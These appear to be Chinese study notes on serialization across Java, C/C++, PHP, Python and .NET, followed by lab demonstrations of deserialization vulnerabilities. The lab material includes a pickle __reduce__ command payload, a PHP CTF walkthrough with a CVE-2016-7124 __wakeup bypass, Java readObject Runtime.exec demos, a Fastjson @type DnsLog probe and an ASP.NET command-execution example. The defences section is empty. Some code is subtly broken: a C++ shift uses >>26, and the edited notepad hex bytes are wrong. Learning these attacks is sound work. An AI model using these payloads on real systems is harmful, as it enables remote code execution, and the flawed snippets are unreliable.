序列化反序列化

	Java序列化与反序列化

		基本概念

			序列化和反序列化的定义
				Java序列化就是指把Java对象转换为字节序列的过程
				Java反序列化就是指把字节序列恢复为Java对象的过程
				序列化最重要的作用
					在传递和保存对象时保证对象的完整性和可传递性，对象转换为有序字节流，以便在网络上传输或者保存在本地文件中
				反序列化最重要的作用
					根据字节流中保存的对象状态及描述信息，通过反序列化重建对象
				核心作用就是对象状态的保存和重建(整个过程核心点就是字节流中所保存的对象状态及描述信息)

			json/xml的数据传递
				在数据传输(也可称为网络传输)前，先通过序列化工具类将Java对象序列化为json/xml文件
				在数据传输(也可称为网络传输)后，再将json/xml文件反序列化为对应语言的对象

			序列化优点
				* 将对象转为字节流存储到硬盘上，当JVM停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间(永久性保存对象)
				* 序列化成字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输
				* 通过序列化可以在进程间传递对象

			序列化算法需要做的事
				* 将对象实例相关的类元数据输出
				* 递归地输出类的超类描述直到不再有超类
				* 类元数据输出完毕后，从最顶端的超类开始输出对象实例的实际数据值
				* 从上至下递归输出实例的数据

		Java实现序列化和反序列化的过程

			实现序列化的必备要求
				只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列(不是则会抛出异常)

			JDK中序列化和反序列化的API
				* java.io.ObjectInputStream(对象输入流)
					该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回
				* java.io.ObjectOutputStream(对象输出流)
					该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出

			实现序列化和反序列化的三种实现
				* 若Student类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化
					ObjectOutputStream采用默认的序列化方式，对Student对象的非transient的实例变量进行序列化
					ObjcetInputStream采用默认的反序列化方式，对Student对象的非transient的实例变量进行反序列化
				* 若Student类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)，则采用以下方式进行序列化与反序列化
					ObjectOutputStream调用Student对象的writeObject(ObjectOutputStream out)的方法进行序列化
					ObjectInputStream会调用Student对象的readObject(ObjectInputStream in)的方法进行反序列化
				* 若Student类实现了Externalnalizable接口，且Student类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化
					ObjectOutputStream调用Student对象的writeExternal(ObjectOutput out))的方法进行序列化
					ObjectInputStream会调用Student对象的readExternal(ObjectInput in)的方法进行反序列化

			序列化和反序列化代码示例
				-------------------------------------------------------------------------------------
				public class SerializableTest 
				{
    			    public static void main(String[] args) throws IOException, ClassNotFoundException
					{
    			        //序列化
    			        FileOutputStream fos = new FileOutputStream("object.out");
    			        ObjectOutputStream oos = new ObjectOutputStream(fos);
    			        Student student1 = new Student("lihao", "wjwlh", "21");
    			        oos.writeObject(student1);
    			        oos.flush();
    			        oos.close();
    			        //反序列化
    			        FileInputStream fis = new FileInputStream("object.out");
    			        ObjectInputStream ois = new ObjectInputStream(fis);
    			        Student student2 = (Student) ois.readObject();
    			        System.out.println(student2.getUserName()+ " " +
    			                student2.getPassword() + " " + student2.getYear());
    				}
				}
				-------------------------------------------------------------------------------------
				-----------------------------------------------------------------------
				public class Student implements Serializable
				{                             

				    private static final long serialVersionUID = -6060343040263809614L;

				    private String userName;                                              
				    private String password;                                              
				    private String year;                                                  

				    public String getUserName() 
					{                                         
				        return userName;                                                  
				    }                                                                     

				    public String getPassword() 
					{                                         
				        return password;                                                  
				    }                                                                     

				    public void setUserName(String userName) 
					{                            
				        this.userName = userName;                                         
				    }                                                                     

				    public void setPassword(String password) 
					{                            
				        this.password = password;                                         
				    }                                                                     

				    public String getYear() 
					{                                             
				        return year;                                                      
				    }                                                                     

				    public void setYear(String year) 
					{                                    
				        this.year = year;                                                 
				    }                                                                     

				    public Student(String userName, String password, String year) 
					{       
				        this.userName = userName;                                         
				        this.password = password;                                         
				        this.year = year;                                                 
				    }                                                                     
				}                                                                         
				-----------------------------------------------------------------------

		序列化和反序列化的注意点
			* 序列化时，只对对象的状态进行保存，而不管对象的方法
			* 当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口
			* 当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化
			* 并非所有的对象都可以序列化，至于为什么不可以，有很多原因了
				* 安全方面的原因，比如一个对象拥有private，public等field，对于一个要传输的对象，比如写到文件，或者进行RMI传输等等，在序列化进行传输的过程中，这个对象的private等域是不受保护的
				* 资源分配方面的原因，比如socket，thread类，如果可以序列化，进行传输或者保存，也无法对他们进行重新的资源分配，而且，也是没有必要这样实现
			* 声明为static和transient类型的成员数据不能被序列化，因为static代表类的状态，transient代表对象的临时数据
			* 序列化运行时使用一个称为 serialVersionUID的版本号与每个可序列化类相关联，该序列号在反序列化过程中用于验证序列化对象的发送者和接收者是否为该对象加载了与序列化兼容的类为它赋予明确的值
				显式地定义serialVersionUID有两种用途
					* 在某些场合，希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有相同的serialVersionUID
					* 在某些场合，不希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有不同的serialVersionUID
			* Java有很多基础类已经实现了serializable接口，比如String,Vector等，但是也有一些没有实现serializable接口的
			* 如果一个对象的成员变量是一个对象，那么这个对象的数据成员也会被保存，这是能用序列化解决深拷贝的重要原因
			{浅拷贝请使用Clone接口的原型模式}

	C/C++序列化与反序列化
		序列化指的是将一个内存对象转化成一串字节数据(存储在一个字节数组中)，可用于保存到本地文件或网络传输
		反序列化就是将字节数据还原成内存对象
		----------------
		struct student
		{
		    int id;
		    string name;
		};
		----------------
		将一个student对象转换成字节数据存储在ByteArray[20]中称为序列化代码
		-------------------------------------------------------
		int count = 0;
		char ByteArray[20];
		student s;
		s.id = 12;
		s.name = "specialist";
		memcpy(ByteArray,&s.id,sizeof(s.id));
		count += sizeof(s.id);
		memcpy(ByteArray+count,s.name.c_str(),s.name.length());
		count += s.name.length();
		-------------------------------------------------------
		把字节数据还原成student对象称为反序列化代码
		---------------------------------------
		student ss;
		memcpy(&ss.id,ByteArray,sizeof(ss.id));
		ss.name.append(ByteArray+4,count-4);
		---------------------------------------
		其实在上述代码中存在问题只是memcpy函数隐藏了这个细节
		在vs的内存窗口中我们可以看到s.id的内存视图为0c 00 00 00（16进制），这似乎和我们想的00 00 00 0c不一样，这就是所谓的大端系统(内存中高位字节在前)和小端系统(内存中低位字节在前)，而目前我们的系统大多是小端系统，而一般在网络传输中却规定使用大端传输(如果不规定当我们将0c 00 00 00这四个字节传给对方，对方就不清楚这四个字节的值？0c 00 00 00 or 00 00 00 0c)，我们用memcpy函数的时候实际上就是对内存的拷贝，而前面讲了在小端系统中对于s.id这个值拷贝到bytearray中的肯定是0c 00 00 00，然后接收端接收到的是0c 00 00 00以为你发是12的6次方(也不一定如果对端也是用的C语言直接用memcpy将0c 00 00 00拷贝s.id对应的内存，s.id的值还是12,就如上述代码，但是客户端和服务端的语言不一定一样)，这显然与你想发的12差太多了，于是我们使用位操作(语言无关)来实现序列化与反序列化，以s.id为例代码如(注意位操作针对的是数值本身而非内存不要搞混了)
		-----------------------------------------------
		/*移位之后ByteArray中前四个字节存的便是00 00 00 0c*/
		ByteArray[0] = s.id>>24; 
		ByteArray[1] = s.id>>26; 
		ByteArray[2] = s.id>>8;
		ByteArray[3] = s.id;
		-----------------------------------------------
		接收端再移回来就行了
		-------------------------
		s.id += ByteArray[0]<<24; 
		s.id += ByteArray[1]<<16;
		s.id += ByteArray[2]<<8;
		s.id += ByteArray[3];
		-------------------------

	php序列化与反序列化

		serialize
			序列化是将变量或对象转换成字符串的过程
			------------------------------------------------
			<?php
				class man
				{
					public $name;
					public $age;
					public $height;

					function __construct($name,$age,$height)
					{
						//_construct：创建对象时初始化
						$this->name = $name;
						$this->age = $age;
						$this->height = $height;
					}
				}
				$man=new man("Bob",5,20);
				var_dump(serialize($man));
			?>
			------------------------------------------------
			输出
				string(67) "O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}"
				Object(O)： O:<class_name_length>:"<class_name>":<number_of_properties>:{<properties>}
				Boolean（b）: b:value;(0或1)
				double（d）
				integer（i）: i:value;
				array（a）： a:<length>:{key,keyvalue}
				string（s）: s:<length>:value;
				null（N）

		unserialize
			反序列化是将字符串转换成变量或对象的过程
			--------------------------------------------------------------------------------
			<?php
				class man
				{
					public $name;
					public $age;
					public $height;

					function __construct($name,$age,$height)
					{
						$this->name = $name;
						$this->age = $age;
						$this->height = $height;
					}
				}
				$man= 'O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}';
				var_dump(unserialize($man));
			?>
			--------------------------------------------------------------------------------
			输出
				object(man)#1 (3) 
				{
					["name"]=>
					string(3) "Bob"
					["age"]=>
					int(5)
					["height"]=>
					int(20)
				}

	    反序列化漏洞
			两个条件
				* unserialize()函数的参数可控
				* php中有可以利用的类并且类中有魔幻函数
			魔幻函数
				_construct()：创建对象时初始化
				_destruction()：结束时销毁对象
				_toString()：对象被当作字符串时使用
				_sleep()：序列化对象之前调用
				_wakeup()：反序列化之前调用
				_call()：调用对象不存在时使用
				_get()：调用私有属性时使用
			index.php
				--------------------------------------------------------------------------------------
				<?php

				class SoFun
				{
					public $file='index.php';

					function __destruct()
					{
						if(!empty($this->file))
						{
							if(strchr($this-> file,"\\")===false &&  strchr($this->file, '/')===false)
							{
								echo "<br>";
								show_source(dirname (__FILE__).'/'.$this ->file);
								}
							else
								die('Wrong filename.');
						}
					}

					function __wakeup()
					{ 
						$this-> file='index.php'; 
					}  

					public function __toString(){return '' ;}
				}

				if (!isset($_GET['file']))
				{
					show_source('index.php');
				} 
				else
				{ 
					$file = $_GET['file']; 
					echo unserialize($file); 
				} 
				?>  
				<!--key in flag.php-->
				--------------------------------------------------------------------------------------
			flag.php
				------------------------
				<?php

				echo "key{you got it!!}"

				?>
				------------------------
			代码审计
				* 代码最后提示key在flag.php里，因此我们要想办法读里面的内容
				* 在__destruct()魔术方法中，show_source(dirname (__FILE__).'/'.$this ->file)这里是解题的关键，在反序列化之后会自动调用__destruct方法，可以利用这个将flag.php的内容读出来
				* 在__wakeup()魔术方法中，在反序列化后会自动调用__wakeup方法并将file的值置为index.php
				* 我们要想读出flag.php里的内容需要调用__destruct方法而绕过__wakeup方法
				这里要用到CVE-2016-7124漏洞：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
				构造序列化对象：O:5:"SoFun":1:{s:4:"file";s:8:"flag.php";}
				构造绕过__wakeup：O:5:"SoFun":2:{s:4:"file";s:8:"flag.php";}

	python序列化与反序列化

		Pyhton在json中load和loads区别
			相同点
				dump和dumps都实现了序列化
				load和loads都实现反序列化
			变量从内存中变成可存储或传输的过程称之为序列化
			序列化是将对象状态转化为可保存或可传输格式的过程
			变量内容从序列化的对象重新读到内存里称之为反序列化
			反序列化是流转换为对象
			区别
				load和loads(反序列化)
					load
						针对文件句柄，将json格式的字符转换为dict，从文件中读取(将string转换为dict)
						-----------------------------------------
						a_json = json.load(open('demo.json','r'))
						-----------------------------------------
					loads
						针对内存对象，将string转换为dict (将string转换为dict)
						-----------------------------------------
						a = json.loads('{'a':'1111','b':'2222'}')
						-----------------------------------------
				dump和dumps(序列化)
					dump
						将dict类型转换为json字符串格式，写入到文件(易存储)
						-----------------------------------------
						a_dict = {'a':'1111','b':'2222'}
						json.dump(a_dict, open('demo.json', 'w'))
						-----------------------------------------
					dumps
						将dict转换为string(易传输)
						--------------------------------
						a_dict = {'a':'1111','b':'2222'}
						a_str = json.dumps(a_dict)
						--------------------------------

		总结
			根据序列化和反序列的特性
				loads： 是将string转换为dict
				dumps： 是将dict转换为string
				load： 是将里json格式字符串转化为dict，读取文件
				dump： 是将dict类型转换为json格式字符串，存入文件
			JSON进阶
				序列化
					------------------------------------------------------
					# 使用class对象的__dict__方法
					class Student(object):
					    def __init__(self, name, age, score):
					        self.name = name
					        self.age = age
					        self.score = score
					import json
					s = Student('Bob', 20, 88)
					print(json.dumps(s, default=lambda obj: obj.__dict__))
					------------------------------------------------------
				反序列化
					-----------------------------------------------------
					def dict2student(d):
					    return Student(d['name'], d['age'], d['score'])

					json_str = '{"age": 20, "score": 88, "name": "Bob"}'
					print(json.loads(json_str, object_hook=dict2student))
					-----------------------------------------------------

		python中的序列化和反序列化
			Python提供两个模块来实现序列化
				* cPickle
				* pickle
			这两个模块功能是一样的，区别在于cPickle是C语言写的，速度快，pickle是纯Python写的，速度慢
			变量从内存中变成可存储或传输的过程称之为序列化，在Python中叫pickling
			变量内容从序列化的对象重新读到内存里称之为反序列化，即unpickling
			----------------------------
			try:
			    import cPickle as pickle
			except ImportError:
			    import pickle
			----------------------------
			将内存对象存取到磁盘
			------------------------------------------
			a = dict(a=1, b=2, c=3)
			pickle.dumps(a)# 将对象序列化为str然后存入文件
			------------------------------------------
			-------------------------------------------------------------------------------------------
			a = dict(a=1, b=2, c=3)
			pickle.dump(a, open('a.txt', 'wb'))# 使用dump直接把对象序列化为file-like Object，注意是二进制存储
			-------------------------------------------------------------------------------------------
			从磁盘读取到内存对象
			-------------------------------------------------------------------
			pickle.load(open('a.txt', 'rb'))#从file-like Object中直接反序列化出对象
			-------------------------------------------------------------------
		
		反序列化漏洞
			漏洞简介
				序列化
					把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程
					例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式
				反序列化
					把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程
					例如将二进制数据流或文件加载到内存中还原为对象
				反序列化漏洞首次出现在2015
				虽然漏洞较新，但利用十分热门，主要原因还是太过信任客户端提交的数据，容易被开发者忽略，该漏洞一般都可执行任意命令或代码，造成的影响较大
			漏洞成因
				在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码(如Shiro1.2.4)，使用不安全的反序列化框架库(如Fastjson1.2.24)或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据(执行特定代码或命令的数据)传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的
			漏洞可能出现的位置
				* 解析认证token、session的位置
				* 将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等
				* 将对象序列化后在网络中传输，如传输json数据，xml数据等
				* 参数传递给程序
				* 使用RMI协议，被广泛使用的RMI协议完全基于序列化
				* 使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等
				* 定义协议用来接收与发送原始的java对象
			漏洞原理
				在Python和PHP中，一般通过构造一个包含魔术方法(在发生特定事件或场景时被自动调用的函数，通常是构造函数或析构函数)的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序反序列化该对象时触发魔术方法从而执行命令或代码
				在Java中没有魔术方法，但是有反射(reflection)机制
					在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制
				一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行
			Python反序列化漏洞实验
				以pickle模块为例，假设浏览器传递序列化后的Cookie给服务器保存，服务器经过一些处理后反序列化还原Cookie
				-------------------------------
				#!/usr/bin/python3
				import pickle
				# 客户端设置Cookie
				set_cookie='abcdefasfsaafasf'
				# 序列化后传递
				cookie=pickle.dumps(set_cookie)
				print("序列化：",cookie)
				# ...
				# 服务器接收到序列化后的Cookie
				# 反序列化还原Cookie
				new_cookie=pickle.loads(cookie)
				print("反序列化：",new_cookie)
				-------------------------------
				程序正常运行时
				-------------------------------------------------------------------------------
				C:\Users\Infiltrator\Desktop\test\py test.py
				序列化:b'\x80\x04\x95\x14\x00\x00\x00\x00\x00\x00\x00\x8c\x10abcdefsaafasf\x94.'
				反序列化:abcdefsaafasf
				-------------------------------------------------------------------------------
				利用pickle模块和魔术方法__reduce__生成执行命令的Payload
				------------------------------------------------------------------------------------------
				#!/usr/bin/python3
				import pickle
				import os

				# 定义一个执行命令的类
				class exec:
					def __init__(self,cmd):
						self.cmd=cmd
					#  __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用，
					#  第二个元素是可调用对象的参数，pickle.loads会解决import问题，对于未引入的module会自动尝试import
					def __reduce__(self):
						return (os.system,(self.cmd,))
				# 实例化对象
				res=exec('whoami')
				# 生成序列化数据
				payload=pickle.dumps(res)
				print("Payload:",payload)
				------------------------------------------------------------------------------------------
				生成执行whoami命令的Payload
				-------------------------------------------------------------------------------------------------------------------------------
				C:\Users\Infiltrator\Desktop\test\py test.py
				Payload:b'\x80\x04\x95\xle\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
				-------------------------------------------------------------------------------------------------------------------------------
				使用执行whoami命令的Payload替换序列化后的Cookie的值模拟RCE漏洞利用，当正常程序反序列化Cookie值时生成包含__reduce__函数的exec类，从而执行命令
				-------------------------------------------------------------------------------------------------------------------------------
				#!/usr/bin/python3
				import pickle
				# 传递执行whoami命令的序列化数据
				cookie=b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
				# 反序列化还原Cookie
				new_cookie=pickle.loads(cookie)
				-------------------------------------------------------------------------------------------------------------------------------
				程序运行结果
				--------------------------------------------
				C:\Users\Infiltrator\Desktop\test\py test.py
				laptop-****Ortk\infiltrator
				--------------------------------------------
			PHP反序列化漏洞实验
				PHP中通常使用serialize函数进行序列化，使用unserialize函数进行反序列化
				serialize函数输出格式
					-----------------------------------------------
					NULL被序列化为：N
					Boolean型数据序列化为：b:1，b:0，分别代表True和False
					Integer型数据序列化为：i:数值
					String型数据序列化为：s:长度:"值"
					对象序列化为：O:类名长度:类名:字段数:字段
					-----------------------------------------------
					输出的数字基本都是代表长度，在构造Payload时需要注意修改长度
				PHP中常用魔术方法
					-----------------------------------------
					__construct：当对象被创建时调用
					__destruct：当对象被销毁前调用
					__sleep：执行serialize函数前调用
					__wakeup：执行unserialize函数前调用
					__call：在对象中调用不可访问的方法时调用
					__callStatic：用静态方法调用不可访问方法时调用
					__get：获得类成因变量时调用
					__set：设置类成员变量时调用
					-----------------------------------------
					使用下面代码创建一个类A并实例化一个对象a，然后输出序列化对象a后的值
					-------------------------------------------------------
					<?php
						// 定义一个类
						class A{
							var $test = "Hello";
							function __construct(){
								print "<h1>ABCD</h1>";
							}
						}
						// 实例化一个对象a
						$a=new A();
						// 序列化对象a
						print "Serialize Object A: ".serialize($a)."<br/>";
					?>
					-------------------------------------------------------
					PHP中序列化后的数据中并没有像Python一样包含函数__construct和print的信息，而仅仅是类名和成员变量的信息
					因此，在unserialize函数的参数可控的情况下，还需要代码中包含魔术方法才能利用反序列化漏洞
					使用下面代码定义一个包含魔术方法__destruct的类A，然后实例化一个对象a并输出序列化后的数据，在对象销毁的时候程序会调用system函数执行df命令，然后通过GET方法传递参数arg的值给服务器进行反序列化
					------------------------------------------------------
					<?php
						// 定义一个类
						class A{
							// 设置变量值为df
							var $test = "df";
							// 定义析构函数，在类A销毁时执行system("df")
							function __destruct(){
								print "Execute CMD: ".$this->test."<br/>";
								print "Result: ";
								system($this->test);
								print "<br/>";
							}
						}
						// 实例化一个对象a
						$a=new A();
						// 序列化对象a
						print "Serialize Object A: ".serialize($a)."<br/>";
						// GET方式获取参数arg的值
						$arg = $_GET['arg'];
						// 反序列化参数arg的值
						$a_unser = unserialize($arg);
					?>
					------------------------------------------------------
					不传入arg参数时，服务器返回对象a序列化后的数据和df命令执行的结果
					利用对象a序列化后的值构造执行id命令的Payload：O:1:"A":1:{s:4:"test";s:2:"id";}，通过arg参数提交之后，在反序列化的过程中成功覆盖变量test的值为id，并在对象销毁时执行命令
					当然，现实环境中几乎没有这样方便的攻击链，需要花不少时间去寻找POP链
						https://www.freebuf.com/column/203767.html
						https://www.freebuf.com/column/203769.html
				Java反序列化漏洞实验
					Java中通常使用Java.io.ObjectOutputStream类中的writeObject方法进行序列化，java.io.ObjectInputStream类中的readObject方法进行反序列化
					使用下面代码将字符串进行序列化和反序列化
					-----------------------------------------------------------------------------------------------
					package com.company;
					import java.io.ObjectOutputStream;
					import java.io.ObjectInputStream;
					import java.io.FileOutputStream;
					import java.io.FileInputStream;

					public class Main{
						public static void main(String args[]) throws Exception {
							String obj = "hello";
							// 将序列化后的数据写入文件a.ser中，当序列化一个对象到文件时，按照Java的标准约定是给文件一个.ser扩展名
							FileOutputStream fos = new FileOutputStream("a.ser");
							ObjectOutputStream os = new ObjectOutputStream(fos);
							os.writeObject(obj);
							os.close();
							// 从文件a.ser中读取数据
							FileInputStream fis = new FileInputStream("a.ser");
							ObjectInputStream ois = new ObjectInputStream(fis);
							// 通过反序列化恢复字符串
							String obj2 = (String)ois.readObject();
							System.out.println(obj2);
							ois.close();
						}
					}
					-----------------------------------------------------------------------------------------------
					程序执行后生成a.ser文件
					以十六进制查看a.ser文件内容
					-----------------------------
					aced 0005 7400 0568 656c 6c6f
					-----------------------------
					Java序列化数据格式始终以双字节的十六进制0xAC ED作为开头，Base64编码之后为rO0
					之后的两个字节是版本号，通常为0x00 05
					一个Java类的对象要想序列化成功，必须满足两个条件
						* 该类必须实现java.io.Serializable接口
						* 该类的所有属性必须是可序列化的，如果有一个属性不是可序列化的，则该属性必须注明是短暂的
					使用下面代码将对象序列化后存储到a.ser文件
					-----------------------------------------------------------------------------------------------------
					package com.company;
					import java.io.ObjectOutputStream;
					import java.io.FileOutputStream;
					import java.io.Serializable;
					import java.io.IOException;
					
					// 定义一个实现 java.io.Serializable 接口的类Test
					class Test implements Serializable {
						public String cmd="calc";
						// 重写readObject()方法
						private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
							// 执行默认的readObject()方法
							in.defaultReadObject();
							// 执行打开计算器程序的命令
							Runtime.getRuntime().exec(cmd);
						}
					}
					public class Main{
						public static void main(String args[]) throws Exception{
							// 实例化对象test
							Test test = new Test();
							// 将对象test序列化后写入a.ser文件
							FileOutputStream fos = new FileOutputStream("a.ser");
							ObjectOutputStream os = new ObjectOutputStream(fos);
							os.writeObject(test);
							os.close();
						}
					}
					-----------------------------------------------------------------------------------------------------
					执行程序后生成a.ser文件，以十六进制格式查看文件内容
					---------------------------------------
					aced 0005 7372 0010 636f 6d2e 636f 6d70
					616e 792e 5465 7374 da4b c8dc cb93 5ebc
					0200 014c 0003 636d 6474 0012 4c6a 6176
					612f 6c61 6e67 2f53 7472 696e 673b 7870
					7400 0463 616c 63
					---------------------------------------
					最后5个字节分别为字符串长度和calc的ASCII值
					因此，修改文件为下图所示，即notepad的ASCII值和长度
					---------------------------------------
					aced 0005 7372 0010 636f 6d2e 636f 6d70
					616e 792e 5465 7374 da4b c8dc cb93 5ebc
					0200 014c 0003 636d 6474 0012 4c6a 6176
					612f 6c61 6e67 2f53 7472 696e 673b 7870
					7400 078e 6f74 6570 6164
					---------------------------------------
					使用下面代码进行反序列化对象
					-----------------------------------------------------------------------------------------------------
					package com.company; 
					import java.io.ObjectInputStream;
					import java.io.FileInputStream;
					import java.io.Serializable;
					import java.io.IOException;
					
					// 定义一个实现 java.io.Serializable 接口的类Test
					class Test implements Serializable {
						public String cmd="calc";
						// 重写readObject()方法
						private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
							// 执行默认的readObject()方法
							in.defaultReadObject();
							// 执行打开计算器程序的命令
							Runtime.getRuntime().exec(cmd);
						}
					}

					public class Main{
						public static void main(String args[]) throws Exception{
							// 从a.ser文件中反序列化test对象
							FileInputStream fis = new FileInputStream("a.ser");
							ObjectInputStream ois = new ObjectInputStream(fis);
							Test objectFromDisk = (Test)ois.readObject();
							System.out.println(objectFromDisk.cmd);
							ois.close();
						}
					}
					-----------------------------------------------------------------------------------------------------
					程序执行后成功运行notepad
					现实环境中也没有这样方便的攻击链，需要去寻找POP链
						https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/
				FastJson反序列化漏洞简单实验 
					FastJson作为史上最快的Json解析库应用也十分广泛，在1.2.69版本以下，其AutoType特性在反序列化过程中会导致反序列化漏洞，这个特性就是：在对JSON字符串进行反序列化的时候，会读取@type参数指定的类，然后把JSON内容反序列化为此类的对象，并且会调用这个类的设置(setter)方法
					实验环境
						前端采用json提交用户名密码
						后台使用fastjson 1.2.24版本
						源码和WAR包
							https://github.com/NHPT/Java_Deserialization_Vulnerability_Experiment
					创建一个User类，用于查看序列化数据格式
					创建一个home类用于输出user对象的序列化数据
					创建一个login类用于获取前端页面提交的json格式用户名和密码数据，并使用JSON.parseObject方法进行反序列化解析json数据，在后台可看到提交的数据
					访问home页面可直接获取user对象序列化后的结果
					@type的值为对象所属的类，user和passwd分别为对象的用户名属性和密码属性
					因此可以利用AutoType特性，构造一个使用@type参数指定一个攻击类库，包含类属性或方法的JSON字符串提交到服务器，在反序列化时调用这个类的方法达到执行代码的目的
					通常使用java.net.Inet4Address类或java.net.Inet6Address类，通过val参数传递域名，利用DnsLog进行漏洞检测，即：{"@type":"java.net.Inet4Address","val":"DnsLog"}
					在登录页面输入用户名和密码提交，拦截数据包，修改提交的Json数据
					虽然服务器返回错误信息，但Payload仍然被成功执行，在DnsLog网站可以看到解析记录
					要执行命令需要构造新的POP链，常用的POP链
						* 基于JNDI注入
						* 基于ClassLoader
						* 基于TemplatesImpl
					由于本实验仅使用最小依赖编写，此处不再详细分析POP链，更多资料请查阅
						https://www.cnblogs.com/nice0e3/p/14776043.html
						https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/
				ASP.NET反序列化实验
					.NET框架包含多个序列化类，BinaryFormatter，JavaScriptSerializer，XmlSerializer，DataContractSerializer，本实验以XML序列化和反序列化为例
					实验环境
						采用Xml提交数据
						使用.NET Framework 4.6.1
						完整源码
							https://github.com/NHPT/ASP.NET-Deserialization-Vulnerability-Experiment
					使用下面代码定义一个Test类，包含执行ipconfig命令并返回执行结果的函数Run，使用XmlSerializer类将对象序列化后输出到页面
					---------------------------------------------------------------------------------------------------------------------------------------------------
					using System;
					using System.Diagnostics;
					using System.IO;
					using System.Text;
					using System.Xml.Serialization;
					
					namespace ASP.NETStudy
					{
						[Serializable]
						public class Test
						{
							public string _cmd = "ipconfig";
							public Test(string cmd)
							{
								_cmd = cmd;
							}
							public Test()
							{
							}
							public String Run()
							{
								Process p = new Process();
								// 设置要启动的应用程序
								p.StartInfo.FileName = "cmd.exe";
								// 不使用操作系统shell启动
								p.StartInfo.UseShellExecute = false;
								// 接受来自调用程序的输入信息
								p.StartInfo.RedirectStandardInput = true;
								// 输出信息
								p.StartInfo.RedirectStandardOutput = true;
								// 输出错误
								p.StartInfo.RedirectStandardError = true;
								// 不显示程序窗口
								p.StartInfo.CreateNoWindow = true;
								// 启动程序
								p.Start();
								// 向cmd窗口发送命令
								p.StandardInput.WriteLine(_cmd + "&exit");
								// 自动刷新
								p.StandardInput.AutoFlush = true;
								// 获取输出信息
								string strOuput = p.StandardOutput.ReadToEnd();
								//等待程序执行完退出进程
								p.WaitForExit();
								p.Close();
								// 返回执行结果
								return strOuput;
							}
						}
						public partial class _default : System.Web.UI.Page
						{
							protected void Page_Load(object sender, EventArgs e)
							{
								// 实例化对象 sc_Test
								Test sc_Test = new Test();
								// 创建字符串缓冲区buffer
								StringBuilder buffer = new StringBuilder();
								// 实例化序列号对象
								XmlSerializer serializer = new XmlSerializer(typeof(Test));
								// 序列化对象sc_Test并存储到buffer
								using (TextWriter writer = new StringWriter(buffer))
								{
									serializer.Serialize(writer, sc_Test);
								}
								String str = buffer.ToString();
								// 将xml数据HTML实体化，防止Windows安全检查拦截
								string r = string.Empty;
								for (int i = 0; i < str.Length; i++)
								{
									r += "&#" + Char.ConvertToUtf32(str, i) + ";";
								}
								// 输出到页面
								Response.Write("<center><h2>序列化数据</h2><textarea rows=\"10\" cols=\"100\" readonly align=\"center\">" + r+ "</textarea></center>");
							}
						}
					}
					---------------------------------------------------------------------------------------------------------------------------------------------------
					使用下面代码将提交的XML数据反序列化，并执行对象的Run函数
					---------------------------------------------------------------------------
					using System;
					using System.IO;
					using System.Xml.Serialization;
					
					namespace ASP.NETStudy
					{
						public partial class info : System.Web.UI.Page
						{
							protected void Page_Load(object sender, EventArgs e)
							{
								if (Request.RequestType == "POST")
								{
									// 获取客户端提交的数据
									StreamReader s = new StreamReader(Request.InputStream);
									// 转换为String格式
									String ss = s.ReadToEnd();
									//Response.Write(ss);
									// 定义反序列化对象
									Test dsc_Test;
									XmlSerializer serializer = new XmlSerializer(typeof(Test));
									// 反序列化数据为dsc_Test对象
									using (TextReader reader = new StringReader(ss))
									{
										Object obj = serializer.Deserialize(reader);
										dsc_Test = (Test)obj;
									}
									// 调用对象的函数Run并返回执行结果到浏览器
									Response.Write(dsc_Test.Run());
								}
							}
						}
					}
					---------------------------------------------------------------------------
					正常情况下访问页面，返回序列化后的数据
					点击查看IP按钮后，客户端提交数据
					服务器执行命令后返回到客户端
					如果攻击者将传输的XML数据进行篡改
					服务器在反序列化后执行whoami命令
				防御方法
